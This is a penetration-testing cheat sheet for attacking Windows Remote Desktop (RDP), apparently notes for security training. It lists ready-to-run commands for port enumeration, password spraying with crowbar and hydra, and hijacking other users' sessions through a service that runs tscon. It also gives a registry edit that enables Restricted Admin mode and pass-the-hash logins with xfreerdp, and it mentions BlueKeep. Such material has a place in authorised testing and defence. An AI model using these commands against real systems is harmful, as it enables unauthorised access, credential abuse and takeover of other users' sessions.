# RDP

## 1. RDP Basics

* Provides a graphical interface for remote access.
* Port: TCP/3389.
* Common attack vectors include weak passwords, password spraying, session hijacking, pass-the-hash, and exploitation of known vulnerabilities.

## 2. Enumeration

```bash
nmap -Pn -p3389 <target_IP>
```

## 3. Misconfigurations and Password Attacks

### Password Spraying

```bash
crowbar -b rdp -s <target_IP>/32 -U <user_list> -c <password>
hydra -L <user_list> -p <password> <target_IP> rdp
```

### RDP Login

```bash
rdesktop -u <user> -p <password> <target_IP>
xfreerdp /v:<target_IP> /u:<user> /p:<password>
```

## 4. Protocol-Specific Attacks

### RDP Session Hijacking

```bash
query user
sc.exe create sessionhijack binpath= "cmd.exe /k tscon <target_session_ID> /dest:rdp-tcp#<our_session_ID>"
net start sessionhijack
```

### Pass-the-Hash

Enable Restricted Admin mode:

```bash
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Authenticate using NT hash:

```bash
xfreerdp /v:<target_IP> /u:<user> /pth:<NT_hash>
```

## 5. Recent RDP Vulnerabilities

* **CVE-2019-0708 (BlueKeep)**
  Remote code execution in legacy Windows systems via a Use-After-Free condition. Can lead to system crashes or full compromise.
